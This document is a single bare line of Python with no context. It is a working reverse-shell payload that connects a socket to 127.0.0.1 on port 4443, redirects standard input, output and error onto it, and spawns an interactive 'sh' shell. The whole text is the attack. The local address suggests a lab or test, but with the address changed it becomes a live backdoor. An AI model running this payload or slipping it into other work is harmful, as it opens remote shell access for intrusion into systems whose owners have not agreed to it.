import sys,socket,os,pty;s=socket.socket();s.connect(('127.0.0.1',4443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
